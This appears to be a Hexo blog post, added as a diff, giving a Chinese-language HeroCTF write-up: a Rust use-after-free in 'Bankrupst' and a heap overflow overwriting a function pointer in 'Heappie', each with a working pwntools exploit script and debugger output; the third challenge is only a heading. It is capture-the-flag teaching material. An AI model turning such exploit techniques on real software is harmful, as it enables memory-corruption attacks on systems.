@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Bankrupst简单的UAF+Rust 源码分析存款大于1337时show可以得到flag，但每次存款不得超过100，存储次数不得超过13 简单的银行账户管理系统，但是使用了unsafe，在内存管理方面没有 Rust 的安全保障。 于是有了这个漏洞 1234567891011121314151617181920212223245 &#x3D;&gt; &amp;#123;    if opened &amp;#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2024/10/28/hero-ctf/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Bankrupst简单的UAF+Rust 源码分析存款大于1337时show可以得到flag，但每次存款不得超过100，存储次数不得超过13 简单的银行账户管理系统，但是使用了unsafe，在内存管理方面没有 Rust 的安全保障。 于是有了这个漏洞 1234567891011121314151617181920212223245 &#x3D;&gt; &amp;#123;    if opened &amp;#123;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-10-28T09:48:42.908Z">
+<meta property="article:modified_time" content="2024-10-30T11:47:40.642Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2024/10/28/hero-ctf/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title> | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/28/hero-ctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2024-10-28 17:48:42" itemprop="dateCreated datePublished" datetime="2024-10-28T17:48:42+08:00">2024-10-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-10-30 19:47:40" itemprop="dateModified" datetime="2024-10-30T19:47:40+08:00">2024-10-30</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Bankrupst"><a href="#Bankrupst" class="headerlink" title="Bankrupst"></a>Bankrupst</h1><p>简单的UAF+Rust</p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>存款大于1337时show可以得到flag，但每次存款不得超过100，存储次数不得超过13</p>
+<p>简单的银行账户管理系统，但是使用了unsafe，在内存管理方面没有 Rust 的安全保障。</p>
+<p>于是有了这个漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">5 =&gt; &#123;</span><br><span class="line">    if opened &#123;</span><br><span class="line">        (*account).balance=0;</span><br><span class="line">        (*account).deposits = 0;</span><br><span class="line">        ptr::drop_in_place(account);</span><br><span class="line">        opened = false;</span><br><span class="line">        println!(&quot;BankRupst card removed.&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        println!(&quot;You must insert your BankRupst card!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">6 =&gt; &#123;</span><br><span class="line">    if opened &#123;</span><br><span class="line">        (*account).balance=0;</span><br><span class="line">        (*account).deposits = 0;</span><br><span class="line">        let layout = Layout::new::&lt;BankAccount&gt;();</span><br><span class="line">        dealloc(account as *mut u8, layout);</span><br><span class="line">        account = ptr::null_mut();</span><br><span class="line">        opened = false;</span><br><span class="line">        println!(&quot;Thank you for using BankRupst!&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        println!(&quot;Thank you for using BankRupst!&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>仔细观察5和6的区别，5在将元素置零后仅仅使用了<code>drop_in_place</code>并没有直接释放内存块</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>存款够13次后直接取出卡，再插卡，就会发现依旧有1300的存款</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;,log_level=&#x27;DEBUG&#x27;)</span><br><span class="line">#r=process(&#x27;./bankRupst&#x27;)</span><br><span class="line">r=remote(&quot;pwn.heroctf.fr&quot;,6001)</span><br><span class="line">s   = lambda x : r.send(x)</span><br><span class="line">sl  = lambda x : r.sendline(x)</span><br><span class="line">sa  = lambda x,y : r.sendafter(x, y)</span><br><span class="line">sla = lambda x,y : r.sendlineafter(x, y)</span><br><span class="line">rc  = lambda x : r.recv(x)</span><br><span class="line">ru  = lambda x : r.recvuntil(x)</span><br><span class="line">rcg = lambda : u64(rc(6).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(r.recvuntil(&quot;\x7f&quot;).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">ra = lambda : r.recvall(timeout=1)</span><br><span class="line">sla(&quot;option:&quot;,str(1))</span><br><span class="line">for i in range(0,13):</span><br><span class="line">    sla(&quot;option:&quot;,str(2))</span><br><span class="line">    sla(&quot;deposit?&quot;,str(100))</span><br><span class="line"></span><br><span class="line">sla(&quot;option:&quot;,str(5))</span><br><span class="line">sla(&quot;option:&quot;,str(1))</span><br><span class="line">sla(&quot;option:&quot;,str(4))</span><br><span class="line">ra()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="Heappie"><a href="#Heappie" class="headerlink" title="Heappie"></a>Heappie</h1><p>glibc:2.36(debian12u8)</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>简单的音乐播放器</p>
+<p>堆结构，但是其实是指针覆写，各种保护齐开且不存在free，存在win函数</p>
+<p>可能随机调用三个函数之一，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Enter music description: &quot;);</span><br><span class="line">__isoc99_scanf(&quot;%s&quot;, music-&gt;description);</span><br></pre></td></tr></table></figure>
+
+<p>可尝试覆写到函数指针</p>
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;\t%d. %s by %s (song: %p)\n&quot;, i + 1, playlist[i].title, playlist[i].artist, playlist[i].play);</span><br></pre></td></tr></table></figure>
+
+<p>泄露出pie基址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for i in [play1_sym, play2_sym, play3_sym]:</span><br><span class="line">    if (play_addr - i) % 0x100 == 0:</span><br><span class="line">        pie = play_addr - i</span><br><span class="line">        break</span><br><span class="line">win_addr = pie + elf.sym[&quot;win&quot;]</span><br></pre></td></tr></table></figure>
+
+<p>playlist结构体</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /40gx playlist</span><br><span class="line">0x55555555c2a0: 0x000055555555527d      0x0000000000000061</span><br><span class="line">0x55555555c2b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000061</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x0000000000000061</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c310: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c320: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c330: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c340: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c350: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c360: 0x0000000000000000      0x000055555555527d</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以覆写des到第二个的play函数，当“Do you want to add a sound to the music? (y&#x2F;n):”选择为n时不会设置play函数</p>
+<p>所以exp为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&quot;amd64&quot;, os=&quot;linux&quot;, log_level=&quot;DEBUG&quot;)</span><br><span class="line">filename = &quot;./heappie&quot;</span><br><span class="line">r = process(filename)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"># r = remote(&quot;pwn.heroctf.fr&quot;, 6001)</span><br><span class="line">s = lambda x: r.send(x)</span><br><span class="line">sl = lambda x: r.sendline(x)</span><br><span class="line">sa = lambda x, y: r.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: r.sendlineafter(x, y)</span><br><span class="line">rc = lambda x: r.recv(x)</span><br><span class="line">ru = lambda x: r.recvuntil(x)</span><br><span class="line">rcg = lambda: u64(rc(6).ljust(8, b&quot;\x00&quot;))</span><br><span class="line">uu64 = lambda: u64(r.recvuntil(&quot;\x7f&quot;).ljust(8, b&quot;\x00&quot;))</span><br><span class="line">ra = lambda: r.recvall(timeout=1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add_y(title, artist, description):</span><br><span class="line">    sla(&quot;&gt;&gt;&quot;, &quot;1&quot;)</span><br><span class="line">    sla(&quot;(y/n): &quot;, &quot;y&quot;)</span><br><span class="line">    sla(&quot;:&quot;, title)</span><br><span class="line">    sla(&quot;:&quot;, artist)</span><br><span class="line">    sla(&quot;:&quot;, description)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add_n(title, artist, description):</span><br><span class="line">    sla(&quot;&gt;&gt;&quot;, &quot;1&quot;)</span><br><span class="line">    sla(&quot;(y/n): &quot;, &quot;n&quot;)</span><br><span class="line">    sla(&quot;:&quot;, title)</span><br><span class="line">    sla(&quot;:&quot;, artist)</span><br><span class="line">    sla(&quot;:&quot;, description)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def play(idx):</span><br><span class="line">    sla(&quot;&gt;&gt;&quot;, &quot;2&quot;)</span><br><span class="line">    sla(&quot;index: &quot;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    sla(&quot;&gt;&gt;&quot;, &quot;3&quot;)</span><br><span class="line">    sla(&quot;index: &quot;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    sla(&quot;&gt;&gt;&quot;, &quot;4&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">play1_sym = elf.sym[&quot;play_1&quot;]</span><br><span class="line">play2_sym = elf.sym[&quot;play_2&quot;]</span><br><span class="line">play3_sym = elf.sym[&quot;play_3&quot;]</span><br><span class="line"></span><br><span class="line">add_y(&quot;A&quot;, &quot;A&quot;, &quot;A&quot;)</span><br><span class="line">show(0)</span><br><span class="line">ru(&quot;0x&quot;)</span><br><span class="line">play_addr = int(rc(12), 16)</span><br><span class="line">pie = 0</span><br><span class="line">for i in [play1_sym, play2_sym, play3_sym]:</span><br><span class="line">    if (play_addr - i) % 0x100 == 0:</span><br><span class="line">        pie = play_addr - i</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">win_addr = pie + elf.sym[&quot;win&quot;]</span><br><span class="line">payload = b&quot;a&quot; * (0x360 - 0x2E0) + p64(win_addr)</span><br><span class="line">add_n(&quot;a&quot;, &quot;a&quot;, payload)</span><br><span class="line">add_n(&quot;a&quot;, &quot;a&quot;, &quot;a&quot;)</span><br><span class="line"></span><br><span class="line">play(2)</span><br><span class="line"></span><br><span class="line">ra()</span><br><span class="line"></span><br><span class="line">log.info(&quot;pie: &quot; + hex(pie))</span><br><span class="line">log.info(&quot;play_addr: &quot; + hex(play_addr))</span><br><span class="line">log.info(&quot;play1_sym: &quot; + hex(play1_sym))</span><br><span class="line">log.info(&quot;play2_sym: &quot; + hex(play2_sym))</span><br><span class="line">log.info(&quot;play3_sym: &quot; + hex(play3_sym))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="Buafllet"><a href="#Buafllet" class="headerlink" title="Buafllet"></a>Buafllet</h1>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/10/21/pwn-college-building-a-web-server/" rel="prev" title="building-a-web-server">
+      <i class="fa fa-chevron-left"></i> building-a-web-server
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/10/31/pwn-college-Reverse-Engineering/" rel="next" title="pwn-college-Reverse-Engineering">
+      pwn-college-Reverse-Engineering <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Bankrupst"><span class="nav-number">1.</span> <span class="nav-text">Bankrupst</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">源码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Heappie"><span class="nav-number">2.</span> <span class="nav-text">Heappie</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Buafllet"><span class="nav-number">3.</span> <span class="nav-text">Buafllet</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
